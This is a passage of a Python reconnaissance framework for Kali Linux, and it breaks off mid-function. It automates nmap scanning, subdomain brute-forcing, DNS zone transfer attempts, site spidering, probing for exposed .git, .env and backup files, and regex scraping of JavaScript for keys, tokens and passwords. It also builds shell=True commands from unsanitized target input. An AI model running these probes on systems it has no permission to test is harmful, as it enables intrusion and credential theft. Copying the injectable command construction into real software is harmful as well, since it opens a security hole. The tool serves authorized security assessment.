#!/usr/bin/env python3
"""
Advanced Web Reconnaissance Framework
================================================
Enhanced for Kali Linux with SecLists, Nmap, and professional tools integration

Author: Yx0R
Purpose: Authorized security assessments and education
License: MIT
DISCLAIMER: Use only on systems you own or have explicit permission to test.
"""

import os
import sys
import json
import time
import argparse
import subprocess
import requests
import socket
import dns.resolver
import concurrent.futures
from urllib.parse import urlparse, urljoin, quote
from datetime import datetime
from typing import List, Dict, Set, Optional, Tuple
import re
import logging
from bs4 import BeautifulSoup
import whois
import ssl
import ipaddress
import asyncio
import aiohttp
import signal
import nmap
import threading
from queue import Queue
import random
import hashlib
import base64
import sqlite3
from pathlib import Path
import yaml
import xmltodict
from colorama import init, Fore, Back, Style
import tldextract
import netifaces
import pandas as pd
from dataclasses import dataclass, field
from enum import Enum
import warnings
warnings.filterwarnings('ignore')

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'recon_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('KaliReconFramework')

class ReconModule(Enum):
    """Enumeration of reconnaissance modules"""
    DNS = "dns"
    SUBDOMAINS = "subdomains"
    PORTS = "ports"
    TECH = "technology"
    DIRS = "directories"
    ENDPOINTS = "endpoints"
    VULN = "vulnerabilities"
    DATA = "data_leakage"
    CLOUD = "cloud"
    WAF = "waf"
    SSL = "ssl"
    EMAIL = "email"
    SOCIAL = "social"
    OSINT = "osint"
    NETWORK = "network"
    APIS = "apis"
    MOBILE = "mobile"
    IOT = "iot"

@dataclass
class ReconConfig:
    """Configuration for reconnaissance framework"""
    target: str
    output_dir: str = "recon_results"
    threads: int = 20
    timeout: int = 30
    user_agent: str = "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
    wordlist_dir: str = "/usr/share/seclists"
    modules: List[ReconModule] = field(default_factory=lambda: list(ReconModule))
    depth: int = 2  # Recon depth level (1: Quick, 2: Standard, 3: Deep)
    api_keys: Dict = field(default_factory=dict)
    proxy: Optional[str] = None
    rate_limit: int = 10  # Requests per second
    save_intermediate: bool = True

class KaliReconFramework:
    """
    Advanced Reconnaissance Framework for Kali Linux
    Leverages SecLists and Kali tools for comprehensive testing
    """
    
    def __init__(self, config: ReconConfig):
        """Initialize the framework with configuration"""
        self.config = config
        self.target = self._normalize_target(config.target)
        self.domain = self._extract_domain(self.target)
        self.base_domain = self._extract_base_domain(self.domain)
        
        # Create output directories
        self._setup_directories()
        
        # Initialize results storage
        self.results = self._init_results_structure()
        
        # Load wordlists
        self.wordlists = self._load_wordlists()
        
        # Initialize tools
        self.nm = nmap.PortScanner() if self._check_tool('nmap') else None
        
        # Set up proxies if configured
        self.session = self._create_session()
        
        # Statistics
        self.stats = {
            'start_time': time.time(),
            'requests_made': 0,
            'subdomains_found': 0,
            'vulnerabilities_found': 0
        }
        
        logger.info(f"{Fore.GREEN}[+] Initialized Kali Recon Framework for {self.target}")
        logger.info(f"{Fore.CYAN}[*] Using SecLists from: {self.config.wordlist_dir}")
    
    def _normalize_target(self, target: str) -> str:
        """Normalize target URL"""
        if not target.startswith(('http://', 'https://')):
            target = f'https://{target}'
        return target.rstrip('/')
    
    def _extract_domain(self, url: str) -> str:
        """Extract domain from URL"""
        parsed = urlparse(url)
        return parsed.netloc
    
    def _extract_base_domain(self, domain: str) -> str:
        """Extract base domain (without subdomains)"""
        extracted = tldextract.extract(domain)
        return f"{extracted.domain}.{extracted.suffix}"
    
    def _setup_directories(self):
        """Create output directory structure"""
        dirs = [
            'subdomains', 'ports', 'directories', 'endpoints',
            'technologies', 'vulnerabilities', 'screenshots',
            'data', 'reports', 'osint', 'network', 'apis',
            'mobile', 'iot', 'logs', 'wordlists'
        ]
        
        for dir_name in dirs:
            dir_path = os.path.join(self.config.output_dir, dir_name)
            os.makedirs(dir_path, exist_ok=True)
    
    def _init_results_structure(self) -> Dict:
        """Initialize results data structure"""
        return {
            'target': self.target,
            'domain': self.domain,
            'base_domain': self.base_domain,
            'scan_start': datetime.now().isoformat(),
            'modules': {},
            'summary': {
                'subdomains': 0,
                'ips': 0,
                'open_ports': 0,
                'technologies': 0,
                'vulnerabilities': 0,
                'data_leaks': 0,
                'emails': 0,
                'credentials': 0
            },
            'details': {
                'dns_records': {},
                'subdomains': [],
                'ips': [],
                'open_ports': {},
                'technologies': {},
                'directories': [],
                'endpoints': [],
                'vulnerabilities': [],
                'data_leaks': [],
                'emails': [],
                'credentials': [],
                'cloud_info': {},
                'waf_info': {},
                'ssl_info': {},
                'social_info': {},
                'osint_info': {},
                'network_info': {},
                'api_info': {},
                'mobile_info': {},
                'iot_info': {}
            }
        }
    
    def _load_wordlists(self) -> Dict[str, List[str]]:
        """Load wordlists from SecLists or create default ones"""
        wordlists = {}
        
        # SecLists paths
        seclist_paths = {
            'subdomains': [
                '/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt',
                '/usr/share/seclists/Discovery/DNS/namelist.txt',
                '/usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top500.txt'
            ],
            'directories': [
                '/usr/share/seclists/Discovery/Web-Content/common.txt',
                '/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',
                '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt'
            ],
            'files': [
                '/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt',
                '/usr/share/seclists/Discovery/Web-Content/CommonBackdoors.txt',
                '/usr/share/seclists/Discovery/Web-Content/Logs.txt'
            ],
            'passwords': [
                '/usr/share/seclists/Passwords/rockyou.txt',
                '/usr/share/seclists/Passwords/2020-200_most_used_passwords.txt'
            ],
            'usernames': [
                '/usr/share/seclists/Usernames/top-usernames-shortlist.txt',
                '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'
            ],
            'api': [
                '/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt',
                '/usr/share/seclists/Discovery/Web-Content/api/rest-api.txt'
            ],
            'fuzz': [
                '/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt',
                '/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt'
            ]
        }
        
        for category, paths in seclist_paths.items():
            wordlists[category] = []
            for path in paths:
                if os.path.exists(path):
                    try:
                        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                            lines = [line.strip() for line in f if line.strip()]
                            wordlists[category].extend(lines[:10000])  # Limit to first 10k
                        logger.info(f"{Fore.GREEN}[+] Loaded {len(lines)} items from {path}")
                    except Exception as e:
                        logger.error(f"{Fore.RED}[-] Failed to load {path}: {e}")
            
            # If no SecLists found, create minimal wordlist
            if not wordlists[category] and category in ['subdomains', 'directories']:
                wordlists[category] = self._create_minimal_wordlist(category)
        
        return wordlists
    
    def _create_minimal_wordlist(self, category: str) -> List[str]:
        """Create minimal wordlist if SecLists not available"""
        if category == 'subdomains':
            return ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging', 'secure']
        elif category == 'directories':
            return ['admin', 'login', 'wp-admin', 'api', 'test', 'backup']
        return []
    
    def _check_tool(self, tool_name: str) -> bool:
        """Check if a tool is available in Kali"""
        try:
            subprocess.run(['which', tool_name], check=True, capture_output=True)
            logger.info(f"{Fore.GREEN}[+] Tool available: {tool_name}")
            return True
        except subprocess.CalledProcessError:
            logger.warning(f"{Fore.YELLOW}[-] Tool not found: {tool_name}")
            return False
    
    def _create_session(self) -> requests.Session:
        """Create HTTP session with proper configuration"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': self.config.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        if self.config.proxy:
            session.proxies = {'http': self.config.proxy, 'https': self.config.proxy}
        
        # Disable SSL warnings for testing
        session.verify = False
        requests.packages.urllib3.disable_warnings()
        
        return session
    
    def save_results(self, module: ReconModule, data: Dict, filename: str = None):
        """Save module results to file"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{module.value}_{timestamp}.json"
        
        filepath = os.path.join(self.config.output_dir, module.value, filename)
        
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2, default=str)
        
        logger.info(f"{Fore.GREEN}[+] Saved {module.value} results to {filepath}")
    
    def _rate_limit(self):
        """Implement rate limiting"""
        time.sleep(1 / self.config.rate_limit)
        self.stats['requests_made'] += 1
    
    # ==================== SECLISTS INTEGRATION ====================
    
    def integrate_seclists(self):
        """Integrate various SecLists for comprehensive testing"""
        logger.info(f"{Fore.CYAN}[*] Integrating SecLists for enhanced reconnaissance...")
        
        # Discover available SecLists
        seclist_categories = self._discover_seclists()
        
        # Create symlinks to useful wordlists
        self._setup_wordlist_symlinks()
        
        # Generate custom wordlists based on findings
        self._generate_target_specific_wordlists()
    
    def _discover_seclists(self) -> Dict[str, List[str]]:
        """Discover available SecLists on the system"""
        base_path = "/usr/share/seclists"
        categories = {}
        
        if os.path.exists(base_path):
            for category in os.listdir(base_path):
                category_path = os.path.join(base_path, category)
                if os.path.isdir(category_path):
                    wordlists = []
                    for root, dirs, files in os.walk(category_path):
                        for file in files:
                            if file.endswith('.txt'):
                                wordlists.append(os.path.join(root, file))
                    if wordlists:
                        categories[category] = wordlists[:10]  # Limit to first 10
        
        logger.info(f"{Fore.GREEN}[+] Discovered {len(categories)} SecList categories")
        return categories
    
    def _setup_wordlist_symlinks(self):
        """Create symlinks to useful wordlists in output directory"""
        wordlist_dir = os.path.join(self.config.output_dir, 'wordlists')
        
        # Common useful wordlists to symlink
        useful_wordlists = {
            'subdomains': '/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt',
            'directories': '/usr/share/seclists/Discovery/Web-Content/common.txt',
            'passwords': '/usr/share/seclists/Passwords/rockyou.txt',
            'usernames': '/usr/share/seclists/Usernames/top-usernames-shortlist.txt',
            'api': '/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt',
            'fuzz': '/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt'
        }
        
        for name, source_path in useful_wordlists.items():
            if os.path.exists(source_path):
                dest_path = os.path.join(wordlist_dir, f"{name}.txt")
                try:
                    if not os.path.exists(dest_path):
                        os.symlink(source_path, dest_path)
                        logger.info(f"{Fore.GREEN}[+] Created symlink: {name} -> {source_path}")
                except Exception as e:
                    logger.warning(f"{Fore.YELLOW}[-] Failed to create symlink for {name}: {e}")
    
    def _generate_target_specific_wordlists(self):
        """Generate target-specific wordlists based on initial findings"""
        target_words = set()
        
        # Extract words from domain
        domain_parts = self.domain.replace('.', '-').split('-')
        target_words.update(domain_parts)
        
        # Common variations
        variations = []
        for word in domain_parts:
            variations.extend([
                word, word.lower(), word.upper(), word.capitalize(),
                f"{word}123", f"{word}2023", f"{word}2024",
                f"{word}_dev", f"{word}_test", f"{word}_prod"
            ])
        
        target_words.update(variations)
        
        # Save target-specific wordlist
        wordlist_path = os.path.join(self.config.output_dir, 'wordlists', 'target_specific.txt')
        with open(wordlist_path, 'w') as f:
            for word in sorted(target_words):
                f.write(f"{word}\n")
        
        logger.info(f"{Fore.GREEN}[+] Generated target-specific wordlist with {len(target_words)} items")
    
    # ==================== KALI TOOLS INTEGRATION ====================
    
    def run_kali_tools(self):
        """Run various Kali Linux tools for reconnaissance"""
        logger.info(f"{Fore.CYAN}[*] Running Kali Linux tools...")
        
        # Run Nmap if available
        if self.nm:
            self.run_nmap_scan()
        
        # Run subdomain enumeration tools
        self.run_subdomain_tools()
        
        # Run directory enumeration tools
        self.run_directory_tools()
        
        # Run vulnerability scanners
        self.run_vulnerability_tools()
    
    def run_nmap_scan(self):
        """Run comprehensive Nmap scan"""
        logger.info(f"{Fore.YELLOW}[*] Running Nmap scan...")
        
        try:
            # Quick scan first
            logger.info(f"{Fore.CYAN}[*] Running initial Nmap scan...")
            self.nm.scan(self.domain, arguments='-sS -sV -O --top-ports 100')
            
            for host in self.nm.all_hosts():
                self.results['details']['ips'].append(host)
                self.results['details']['open_ports'][host] = []
                
                for proto in self.nm[host].all_protocols():
                    ports = self.nm[host][proto].keys()
                    for port in ports:
                        port_info = self.nm[host][proto][port]
                        self.results['details']['open_ports'][host].append({
                            'port': port,
                            'protocol': proto,
                            'state': port_info['state'],
                            'service': port_info['name'],
                            'version': port_info.get('version', ''),
                            'product': port_info.get('product', '')
                        })
                        
                        logger.info(f"{Fore.GREEN}[+] Found {proto.upper()} port {port}: {port_info['name']} {port_info.get('version', '')}")
            
            # Save Nmap results
            self.save_results(ReconModule.NETWORK, {
                'nmap_scan': dict(self.nm._scan_result),
                'open_ports': self.results['details']['open_ports']
            }, 'nmap_scan.json')
            
        except Exception as e:
            logger.error(f"{Fore.RED}[-] Nmap scan failed: {e}")
    
    def run_subdomain_tools(self):
        """Run subdomain enumeration tools"""
        logger.info(f"{Fore.YELLOW}[*] Running subdomain enumeration tools...")
        
        tools = [
            ('sublist3r', f"-d {self.base_domain} -o {self.config.output_dir}/subdomains/sublist3r.txt"),
            ('amass', f"enum -d {self.base_domain} -o {self.config.output_dir}/subdomains/amass.txt"),
            ('subfinder', f"-d {self.base_domain} -o {self.config.output_dir}/subdomains/subfinder.txt"),
            ('assetfinder', f"{self.base_domain} > {self.config.output_dir}/subdomains/assetfinder.txt")
        ]
        
        for tool, command in tools:
            if self._check_tool(tool):
                try:
                    logger.info(f"{Fore.CYAN}[*] Running {tool}...")
                    full_command = f"{tool} {command}"
                    result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
                    
                    if result.returncode == 0:
                        logger.info(f"{Fore.GREEN}[+] {tool} completed successfully")
                        
                        # Parse results
                        output_file = f"{self.config.output_dir}/subdomains/{tool}.txt"
                        if os.path.exists(output_file):
                            with open(output_file, 'r') as f:
                                subdomains = [line.strip() for line in f if line.strip()]
                                for subdomain in subdomains:
                                    if subdomain not in self.results['details']['subdomains']:
                                        self.results['details']['subdomains'].append(subdomain)
                    
                except Exception as e:
                    logger.warning(f"{Fore.YELLOW}[-] {tool} failed: {e}")
    
    def run_directory_tools(self):
        """Run directory enumeration tools"""
        logger.info(f"{Fore.YELLOW}[*] Running directory enumeration tools...")
        
        tools = [
            ('gobuster', f"dir -u {self.target} -w /usr/share/seclists/Discovery/Web-Content/common.txt -o {self.config.output_dir}/directories/gobuster.txt"),
            ('dirb', f"{self.target} /usr/share/seclists/Discovery/Web-Content/common.txt -o {self.config.output_dir}/directories/dirb.txt"),
            ('ffuf', f"-u {self.target}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o {self.config.output_dir}/directories/ffuf.json")
        ]
        
        for tool, command in tools:
            if self._check_tool(tool):
                try:
                    logger.info(f"{Fore.CYAN}[*] Running {tool}...")
                    full_command = f"{tool} {command}"
                    result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
                    
                    if result.returncode == 0:
                        logger.info(f"{Fore.GREEN}[+] {tool} completed successfully")
                except Exception as e:
                    logger.warning(f"{Fore.YELLOW}[-] {tool} failed: {e}")
    
    def run_vulnerability_tools(self):
        """Run vulnerability scanning tools"""
        logger.info(f"{Fore.YELLOW}[*] Running vulnerability scanners...")
        
        tools = [
            ('nikto', f"-h {self.target} -o {self.config.output_dir}/vulnerabilities/nikto.txt"),
            ('wapiti', f"-u {self.target} -o {self.config.output_dir}/vulnerabilities/wapiti/"),
            ('nuclei', f"-u {self.target} -o {self.config.output_dir}/vulnerabilities/nuclei.txt")
        ]
        
        for tool, command in tools:
            if self._check_tool(tool):
                try:
                    logger.info(f"{Fore.CYAN}[*] Running {tool}...")
                    full_command = f"{tool} {command}"
                    result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
                    
                    if result.returncode == 0:
                        logger.info(f"{Fore.GREEN}[+] {tool} completed successfully")
                        
                        # Parse and add vulnerabilities
                        self._parse_vulnerability_results(tool)
                        
                except Exception as e:
                    logger.warning(f"{Fore.YELLOW}[-] {tool} failed: {e}")
    
    def _parse_vulnerability_results(self, tool: str):
        """Parse vulnerability tool results"""
        tool_files = {
            'nikto': f"{self.config.output_dir}/vulnerabilities/nikto.txt",
            'nuclei': f"{self.config.output_dir}/vulnerabilities/nuclei.txt"
        }
        
        if tool in tool_files and os.path.exists(tool_files[tool]):
            with open(tool_files[tool], 'r') as f:
                content = f.read()
                
                # Extract vulnerability information
                vulnerabilities = []
                if tool == 'nikto':
                    for line in content.split('\n'):
                        if line.startswith('+'):
                            vuln = {
                                'tool': 'nikto',
                                'finding': line.strip('+ '),
                                'severity': 'Medium'  # Nikto doesn't provide severity
                            }
                            vulnerabilities.append(vuln)
                
                elif tool == 'nuclei':
                    try:
                        for line in content.split('\n'):
                            if line.strip() and not line.startswith('['):
                                parts = line.split(' ')
                                if len(parts) >= 3:
                                    vuln = {
                                        'tool': 'nuclei',
                                        'type': parts[0],
                                        'severity': parts[1],
                                        'finding': ' '.join(parts[2:])
                                    }
                                    vulnerabilities.append(vuln)
                    except:
                        pass
                
                # Add to results
                for vuln in vulnerabilities:
                    if vuln not in self.results['details']['vulnerabilities']:
                        self.results['details']['vulnerabilities'].append(vuln)
                        self.results['summary']['vulnerabilities'] += 1
    
    # ==================== ENHANCED DNS RECON ====================
    
    def enhanced_dns_recon(self):
        """Perform enhanced DNS reconnaissance using multiple methods"""
        logger.info(f"{Fore.CYAN}[*] Performing enhanced DNS reconnaissance...")
        
        # Traditional DNS queries
        self._dns_queries()
        
        # DNS brute force with SecLists
        self._dns_bruteforce()
        
        # DNS cache snooping
        self._dns_cache_snooping()
        
        # DNS zone transfer attempts
        self._dns_zone_transfer()
        
        # DNS history lookup
        self._dns_history_lookup()
    
    def _dns_queries(self):
        """Perform comprehensive DNS queries"""
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME', 'SRV', 'PTR', 'DNSKEY']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(self.base_domain, record_type)
                self.results['details']['dns_records'][record_type] = [str(r) for r in answers]
                logger.info(f"{Fore.GREEN}[+] {record_type}: {self.results['details']['dns_records'][record_type]}")
            except Exception as e:
                logger.debug(f"{Fore.YELLOW}[-] No {record_type} records: {e}")
    
    def _dns_bruteforce(self):
        """Brute force DNS with SecLists wordlist"""
        logger.info(f"{Fore.YELLOW}[*] Starting DNS brute force...")
        
        if 'subdomains' not in self.wordlists:
            return
        
        found = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = []
            for word in self.wordlists['subdomains'][:5000]:  # Limit for speed
                subdomain = f"{word}.{self.base_domain}"
                futures.append(executor.submit(self._resolve_subdomain, subdomain))
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    found.append(result)
                    if result not in self.results['details']['subdomains']:
                        self.results['details']['subdomains'].append(result)
                        logger.info(f"{Fore.GREEN}[+] Found subdomain: {result}")
        
        self.results['summary']['subdomains'] = len(self.results['details']['subdomains'])
    
    def _resolve_subdomain(self, subdomain: str) -> Optional[str]:
        """Resolve a subdomain"""
        try:
            socket.gethostbyname(subdomain)
            return subdomain
        except:
            return None
    
    def _dns_cache_snooping(self):
        """Attempt DNS cache snooping"""
        logger.info(f"{Fore.YELLOW}[*] Attempting DNS cache snooping...")
        
        # Generate random subdomains to check cache
        random_subdomains = [f"{hashlib.md5(str(i).encode()).hexdigest()[:8]}.{self.base_domain}" 
                           for i in range(10)]
        
        for subdomain in random_subdomains:
            try:
                start = time.time()
                socket.gethostbyname(subdomain)
                elapsed = time.time() - start
                
                # Very fast response might indicate cached entry
                if elapsed < 0.1:
                    logger.info(f"{Fore.GREEN}[+] Possible cached entry: {subdomain} ({elapsed:.3f}s)")
            except:
                pass
    
    def _dns_zone_transfer(self):
        """Attempt DNS zone transfer"""
        logger.info(f"{Fore.YELLOW}[*] Attempting DNS zone transfer...")
        
        # Get nameservers
        try:
            ns_records = self.results['details']['dns_records'].get('NS', [])
            if not ns_records:
                domain_info = whois.whois(self.base_domain)
                if domain_info.name_servers:
                    ns_records = [str(ns).rstrip('.') for ns in domain_info.name_servers]
            
            for ns in ns_records[:3]:
                try:
                    transfer = dns.query.xfr(ns, self.base_domain, timeout=5)
                    zone_data = []
                    for message in transfer:
                        zone_data.extend(message.answer)
                    
                    if zone_data:
                        logger.warning(f"{Fore.RED}[!] ZONE TRANSFER SUCCESSFUL on {ns}!")
                        self.save_results(ReconModule.DNS, 
                                         {'zone_transfer': [str(r) for r in zone_data]},
                                         f'zone_transfer_{ns}.json')
                except Exception as e:
                    logger.debug(f"{Fore.YELLOW}[-] Zone transfer failed on {ns}: {e}")
        except Exception as e:
            logger.debug(f"{Fore.YELLOW}[-] Zone transfer attempt failed: {e}")
    
    def _dns_history_lookup(self):
        """Check DNS history using passive sources"""
        logger.info(f"{Fore.YELLOW}[*] Checking DNS history...")
        
        # This would typically use APIs like SecurityTrails, RiskIQ, etc.
        # For now, we'll simulate with common patterns
        historical_patterns = [
            f"old.{self.base_domain}",
            f"legacy.{self.base_domain}",
            f"archive.{self.base_domain}",
            f"historical.{self.base_domain}",
            f"previous.{self.base_domain}"
        ]
        
        for pattern in historical_patterns:
            try:
                socket.gethostbyname(pattern)
                logger.info(f"{Fore.GREEN}[+] Historical subdomain found: {pattern}")
                if pattern not in self.results['details']['subdomains']:
                    self.results['details']['subdomains'].append(pattern)
            except:
                pass
    
    # ==================== ADVANCED WEB ENUMERATION ====================
    
    def advanced_web_enumeration(self):
        """Perform advanced web application enumeration"""
        logger.info(f"{Fore.CYAN}[*] Starting advanced web enumeration...")
        
        # Spider the website
        self._spider_website()
        
        # Parameter discovery
        self._parameter_discovery()
        
        # API endpoint discovery
        self._api_discovery()
        
        # JavaScript analysis
        self._javascript_analysis()
        
        # Source code disclosure
        self._source_code_disclosure()
        
        # Backup file discovery
        self._backup_file_discovery()
    
    def _spider_website(self):
        """Spider website for links and endpoints"""
        logger.info(f"{Fore.YELLOW}[*] Spidering website...")
        
        visited = set()
        to_visit = [self.target]
        
        while to_visit and len(visited) < 100:  # Limit to 100 pages
            url = to_visit.pop(0)
            if url in visited:
                continue
            
            visited.add(url)
            
            try:
                self._rate_limit()
                response = self.session.get(url, timeout=self.config.timeout)
                
                if response.status_code == 200:
                    # Parse HTML for links
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Extract all links
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urljoin(url, href)
                        
                        # Only follow links within same domain
                        if self.domain in full_url and full_url not in visited:
                            to_visit.append(full_url)
                    
                    # Extract forms
                    forms = []
                    for form in soup.find_all('form'):
                        form_info = {
                            'action': form.get('action', ''),
                            'method': form.get('method', 'GET').upper(),
                            'inputs': []
                        }
                        
                        for input_tag in form.find_all('input'):
                            form_info['inputs'].append({
                                'name': input_tag.get('name', ''),
                                'type': input_tag.get('type', 'text'),
                                'value': input_tag.get('value', '')
                            })
                        
                        forms.append(form_info)
                    
                    if forms:
                        logger.info(f"{Fore.GREEN}[+] Found {len(forms)} forms on {url}")
                        self.results['details']['endpoints'].extend(forms)
                
            except Exception as e:
                logger.debug(f"{Fore.YELLOW}[-] Failed to fetch {url}: {e}")
        
        logger.info(f"{Fore.GREEN}[+] Spidered {len(visited)} pages")
    
    def _parameter_discovery(self):
        """Discover URL parameters"""
        logger.info(f"{Fore.YELLOW}[*] Discovering URL parameters...")
        
        common_params = [
            'id', 'page', 'view', 'file', 'path', 'dir', 'search', 'query',
            'year', 'month', 'day', 'name', 'email', 'phone', 'user', 'account',
            'category', 'product', 'order', 'sort', 'filter', 'limit', 'offset'
        ]
        
        # Test parameters on main page
        for param in common_params:
            test_url = f"{self.target}?{param}=test"
            try:
                self._rate_limit()
                response = self.session.get(test_url, timeout=self.config.timeout)
                
                if response.status_code == 200:
                    # Check if parameter had effect
                    if len(response.content) > 0:
                        param_info = {
                            'parameter': param,
                            'url': test_url,
                            'status_code': response.status_code,
                            'content_length': len(response.content)
                        }
                        
                        if param_info not in self.results['details']['endpoints']:
                            self.results['details']['endpoints'].append(param_info)
                            logger.info(f"{Fore.GREEN}[+] Parameter found: {param}")
                
            except Exception as e:
                logger.debug(f"{Fore.YELLOW}[-] Parameter test failed for {param}: {e}")
    
    def _api_discovery(self):
        """Discover API endpoints"""
        logger.info(f"{Fore.YELLOW}[*] Discovering API endpoints...")
        
        api_patterns = [
            'api', 'api/v1', 'api/v2', 'api/v3', 'rest', 'rest/v1',
            'graphql', 'soap', 'xmlrpc', 'jsonrpc', 'oauth', 'auth',
            'login', 'register', 'logout', 'user', 'users', 'profile',
            'admin', 'dashboard', 'swagger', 'openapi', 'docs'
        ]
        
        for pattern in api_patterns:
            api_url = f"{self.target}/{pattern}"
            try:
                self._rate_limit()
                response = self.session.get(api_url, timeout=self.config.timeout)
                
                if response.status_code in [200, 201, 204, 301, 302, 401, 403]:
                    api_info = {
                        'endpoint': pattern,
                        'url': api_url,
                        'status_code': response.status_code,
                        'content_type': response.headers.get('Content-Type', ''),
                        'headers': dict(response.headers)
                    }
                    
                    # Check for API indicators
                    content_lower = response.text.lower()
                    api_indicators = ['api', 'rest', 'graphql', 'swagger', 'openapi', 'endpoint']
                    
                    if any(indicator in content_lower for indicator in api_indicators):
                        api_info['is_api'] = True
                        logger.info(f"{Fore.GREEN}[+] API endpoint found: {api_url}")
                    
                    if api_info not in self.results['details']['endpoints']:
                        self.results['details']['endpoints'].append(api_info)
                
            except Exception as e:
                logger.debug(f"{Fore.YELLOW}[-] API check failed for {pattern}: {e}")
    
    def _javascript_analysis(self):
        """Analyze JavaScript files for secrets and endpoints"""
        logger.info(f"{Fore.YELLOW}[*] Analyzing JavaScript files...")
        
        try:
            response = self.session.get(self.target, timeout=self.config.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find JavaScript files
            js_files = []
            for script in soup.find_all('script', src=True):
                js_url = urljoin(self.target, script['src'])
                if js_url not in js_files:
                    js_files.append(js_url)
            
            # Analyze each JS file
            for js_url in js_files[:10]:  # Limit to first 10
                try:
                    self._rate_limit()
                    js_response = self.session.get(js_url, timeout=self.config.timeout)
                    
                    if js_response.status_code == 200:
                        js_content = js_response.text
                        
                        # Look for secrets
                        secret_patterns = {
                            'API Keys': r'(?i)(api[_-]?key|apikey)[\"\']?\s*[:=]\s*[\"\']([0-9a-zA-Z\-_]{20,})[\"\']',
                            'Tokens': r'(?i)(token|bearer|jwt|access[_-]?token)[\"\']?\s*[:=]\s*[\"\']([0-9a-zA-Z\-_\.]{20,})[\"\']',
                            'Passwords': r'(?i)(password|passwd|pwd)[\"\']?\s*[:=]\s*[\"\']([^\"\']+)[\"\']',
                            'URLs': r'https?://[a-zA-Z0-9./?=_%:-]+',
                            'Endpoints': r'[\"\'](/[a-zA-Z0-9_\-./]+)[\"\']'
                        }
                        
                        findings = []
                        for pattern_name, pattern in secret_patterns.items():
                            matches = re.findall(pattern, js_content)
                            if matches:
                                for match in matches:
                                    if isinstance(match, tuple):
                                        match = match[-1]
                                    findings.append({
                                        'type': pattern_name,
                                        'value': match[:100] + '...' if len(match) > 100 else match,
                                        'source': js_url
                                    })
                        
                        if findings:
                            logger.info(f"{Fore.GREEN}[+] Found {len(findings)} items in {js_url}")
                            self.results['details']['data_leaks'].extend(findings)
                            self.results['summary']['data_leaks'] += len(findings)
                
                except Exception as e:
                    logger.debug(f"{Fore.YELLOW}[-] Failed to analyze {js_url}: {e}")
        
        except Exception as e:
            logger.error(f"{Fore.RED}[-] JS analysis failed: {e}")
    
    def _source_code_disclosure(self):
        """Check for source code disclosure vulnerabilities"""
        logger.info(f"{Fore.YELLOW}[*] Checking for source code disclosure...")
        
        # Common source files to check
        source_files = [
            '.git', '.git/HEAD', '.git/config',
            '.svn', '.svn/entries',
            '.env', '.env.example',
            'config.php', 'config.json', 'config.yaml',
            'settings.php', 'settings.json',
            'database.yml', 'secrets.yml',
            'composer.json', 'package.json',
            'web.config', 'appsettings.json',
            'phpinfo.php', 'test.php'
        ]
        
        for file_path in source_files:
            test_url = f"{self.target}/{file_path}"
            try:
                self._rate_limit()
                response = self.session.get(test_url, timeout=self.config.timeout)
                
                if response.status_code == 200 and len(response.content) > 0:
                    # Check for source code indicators
                    content = response.text.lower()
                    source_indicators = [
                        '<?php', 'def ', 'function ', 'class ',
                        'import ', 'require', 'include',
                        'database', 'password', 'secret',
                        'aws_', 'api_key', 'token'
                    ]
                    
                    if any(indicator in content for indicator in source_indicators):
                        leak_info = {
                            'type': 'Source Code Disclosure',
                            'file': file_path,
                            'url': test_url,
                            'content_length': len(response.content)
                        }
                        
                        self.results['details']['data_leaks'].append(leak_info)
                        self.results['summary']['data_leaks'] += 1
                        logger.warning(f"{Fore.RED}[!] Source code disclosed: {test_url}")
                
            except Exception as e:
                logger.debug(f"{Fore.YELLOW}[-] Source check failed for {file_path}: {e}")
    
    def _backup_file_discovery(self):
        """Discover backup files"""
        logger.info(f"{Fore.YELLOW}[*] Looking for backup files...")
        
        backup_patterns = [
            'backup', 'backup.zip', 'backup.tar', 'backup.tar.gz',
            'backup.sql', 'dump.sql', 'database_backup.sql',
            'www.zip', 'site.tar', 'web_backup.zip',
            '.bak', '.backup', '.old', '.orig',
            'v1', 'v2', 'old_version', 'previous'
        ]
        
        for pattern in backup_patterns:
            test_url = f"{self.target}/{pattern}"
            try:
                self._rate_limit()
                response = self.session.get(test_url, timeout=self.config.timeout)
                
                if response.status_code == 200:
                    backup_info = {
                        'type': 'Backup File',
